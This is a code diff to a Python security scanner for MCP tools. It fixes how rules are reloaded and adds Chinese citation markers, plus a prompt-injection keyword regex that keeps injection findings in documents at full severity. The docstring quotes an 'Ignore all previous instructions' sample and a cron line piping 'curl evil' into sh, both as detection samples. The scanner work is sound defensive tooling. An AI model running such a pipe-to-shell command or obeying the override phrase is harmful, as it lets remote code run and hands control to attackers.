@@ -638,11 +638,15 @@ _STATIC_RULE_COUNT = len(ALL_RULES)
 GENERATED_RULES = {}
 GENERATED_PACKAGE_BLACKLIST = {}
 _GENERATED_META = {}
+# 已并入 ALL_RULES 的情报驱动规则键。重载时据此撤下上一轮，否则
+# ALL_RULES 只增不减，`get_rule_breakdown()` 会报出自相矛盾的数字。
+_GENERATED_IN_ALL_RULES = set()
 
 
 def _load_generated_rules():
     """载入 data/generated_rules.json。文件缺失或损坏时静默降级，不影响基础规则。"""
-    global GENERATED_RULES, GENERATED_PACKAGE_BLACKLIST, _GENERATED_META
+    global GENERATED_RULES, GENERATED_PACKAGE_BLACKLIST, _GENERATED_META, \
+        _GENERATED_IN_ALL_RULES
     import json as _json
     import os as _os
 
@@ -671,9 +675,18 @@ def _load_generated_rules():
         "owasp_distribution": data.get("owasp_distribution", {}),
     }
 
+    # 重载语义：撤下上一轮并入 ALL_RULES 的键，再并入本轮。
+    # 只做追加不做撤除，会让 ALL_RULES 只增不减 —— data/generated_rules.json
+    # 被 intel_to_rules.py 整体重写后，被剔除的规则仍留在 ALL_RULES 里，
+    # 于是 `len(ALL_RULES)` 与 `static + generated + radar` 永久对不上，
+    # /api/v1/health 的 rules_breakdown 会自相矛盾。
+    for _k in _GENERATED_IN_ALL_RULES:
+        ALL_RULES.pop(_k, None)
+    ALL_RULES.update(GENERATED_RULES)
+    _GENERATED_IN_ALL_RULES = set(GENERATED_RULES)
+
 
 _load_generated_rules()
-ALL_RULES.update(GENERATED_RULES)
 
 
 def get_generated_rules_meta():
@@ -693,6 +706,9 @@ def get_generated_rules_meta():
 RADAR_RULES = {}
 _RADAR_META = {}
 _RADAR_QUARANTINE = {}
+# 已并入 ALL_RULES 的雷达规则键，重载时据此撤下上一轮（理由同
+# _GENERATED_IN_ALL_RULES：只追加不撤除会让 breakdown 永久不自洽）。
+_RADAR_IN_ALL_RULES = set()
 
 # 雷达规则的字段契约。data/radar_rules.json 是机器生成的数据，不是手写常量，
 # 所以它的字段必须在**载入时**校验，不能等第一次扫描才暴露。
@@ -750,7 +766,7 @@ def _load_radar_rules():
     get_radar_load_warnings() 读取。绝不抛异常—加载期失败的正确答案
     是「少一条规则 + 一条可见告警」，而不是整个扫描器 import 失败。
     """
-    global RADAR_RULES, _RADAR_META, _RADAR_QUARANTINE
+    global RADAR_RULES, _RADAR_META, _RADAR_QUARANTINE, _RADAR_IN_ALL_RULES
     import json as _json
     import os as _os
 
@@ -784,9 +800,19 @@ def _load_radar_rules():
         "quarantined": len(_RADAR_QUARANTINE),
     }
 
+    # 重载语义：撤下上一轮并入 ALL_RULES 的键，再并入本轮。
+    # 此前这行 update 只写在模块顶层，import 之后任何一次
+    # _load_radar_rules()（测试隔离、promote 后热重载）都只改 RADAR_RULES、
+    # 不碰 ALL_RULES —— get_rule_breakdown() 随即报出
+    # 「208 + 9 + 19 = 236 却 total = 235」这种自相矛盾的数字，
+    # 而 rules_breakdown 正是部署校验的判据之一。
+    for _k in _RADAR_IN_ALL_RULES:
+        ALL_RULES.pop(_k, None)
+    ALL_RULES.update(RADAR_RULES)
+    _RADAR_IN_ALL_RULES = set(RADAR_RULES)
+
 
 _load_radar_rules()
-ALL_RULES.update(RADAR_RULES)
 
 
 def get_radar_rules_meta():
@@ -1547,7 +1573,13 @@ _CITATION_MARKERS = re.compile(
     r"|\bsuch\s+as\b|\bpatterns?\s+like\b|\bfor\s+example\b|\be\.g\.?\b"
     r"|(?<![\w.])\b(?:fixtures?|samples?|examples?)\b"
     r"|\bis\s+the\s+canonical\b|\bused\s+(?:in\s+)?tests?\b|\bthreat\s+model\b"
-    r"|\bdocs?\s*[:=]|\bdetection\s+fixture\b)"
+    r"|\bdocs?\s*[:=]|\bdetection\s+fixture\b"
+    # 中文标记：词表此前只有英文，中文防御文档整块盲区。本仓库与 distribution
+    # 里的文档大量是中文（例如「它对每行 stdin 的请求返回响应，例如：」后面跟
+    # 一个被 deny 的 cron 载荷），英文词表一个都匹配不上，导致注入家族豁免后
+    # 这类「演示被拦截的载荷」被报成 high。逐词对应上面的英文语义，不含
+    # 「防御」「如下」这类宽泛或祈使式词 —— 后者会把真攻击一起压掉。
+    r"|检测|拦截|拦下|阻止|例如|示例|威胁模型|测试用例|测试样本|已知攻击|已知漏洞)"
 )
 
 
@@ -1565,6 +1597,34 @@ def _rule_id(pattern, owasp_cat):
         return rid
     digest = _hashlib.md5(pattern.encode("utf-8")).hexdigest()[:4].upper()
     return "GEN-%s" % digest
+
+
+_DOC_INJECTION_DESC_RE = re.compile(
+    r"(?i)注入|越狱|忽略/覆盖前文|忘记一切|身份切换|角色扮演|系统提示|提示词"
+    r"|prompt\s*injection|jailbreak|role.?play"
+)
+
+
+def _is_doc_severity_exempt(owasp_cat, desc):
+    """这条规则命中在文档里时，是否不该被 is_doc 整档降级。
+
+    豁免按**规则语义**判定，不是按 OWASP 类别。MCP06 类别里混着两类：
+
+      * 提示词注入 / 越狱 / 角色扮演 / 系统提示窃取 —— 载荷天然住在文本与
+        文档里（工具描述、检索到的网页、markdown、SKILL.md）。这些必须豁免：
+        2026-09-20 实测指令面 28 条正样本在 serious-only 口径下召回 0/28，
+        旗舰样本 "Ignore all previous instructions…" 只有 low。生产路径
+        server.check_prompt_injection 对提示词文本本来就不施加文档降级。
+      * 「持久化/自启动指令」(cron / launchd / 计划任务) —— 文档里给 cron 示例
+        是正常实践，不能报 high。整类豁免会把 guardrail-harness 的 deny 演示
+        样本（`"* * * * * curl evil | sh"`）报成阻断项。
+
+    判别器是「这个类别的载荷天然住在文档里吗」，不是「它是不是 .md」。
+    后者由 _is_citation_context 负责，两条机制各管一段。
+    """
+    if owasp_cat and owasp_cat.startswith("ASI"):
+        return True
+    return owasp_cat == "MCP06" and bool(_DOC_INJECTION_DESC_RE.search(desc or ""))
 
 
 def analyze(files, tool_type="mcp"):
@@ -1599,10 +1659,15 @@ def analyze(files, tool_type="mcp"):
                     # 列号（1-based）：命中点在所属行内的偏移，方便编辑器直接跳转
                     col = m.start() - content.rfind('\n', 0, m.start())
                     actual_severity = severity
-                    if is_doc and severity in ("critical", "high"):
-                        actual_severity = "low"
-                    elif is_doc and severity == "medium":
-                        actual_severity = "info"
+                    # 文档降级：README / docs 里出现「curl 示例」「localhost 用法」
+                    # 「npx -y 安装命令」是正常文档实践，不能报 critical。但这类
+                    # 降级**不适用于注入家族** —— 见 _DOC_SEVERITY_EXEMPT_CATEGORIES。
+                    doc_exempt = _is_doc_severity_exempt(owasp_cat, desc)
+                    if is_doc and not doc_exempt:
+                        if severity in ("critical", "high"):
+                            actual_severity = "low"
+                        elif severity == "medium":
+                            actual_severity = "info"
                     # 引用上下文：防御文档把载荷当被检测对象讨论时，命中不改变
                     # 规则本身，只降级并打标，便于报告层单独统计与用户复核。
                     # 只作用于 critical/high/medium —— info 已经是最低档，无需再降。
@@ -1610,7 +1675,7 @@ def analyze(files, tool_type="mcp"):
                     if citation and actual_severity in ("critical", "high", "medium"):
                         actual_severity = "low"
                     suffix = ""
-                    if is_doc:
+                    if is_doc and not doc_exempt:
                         suffix += " (文档示例)"
                     if citation:
                         suffix += " (引用上下文)"
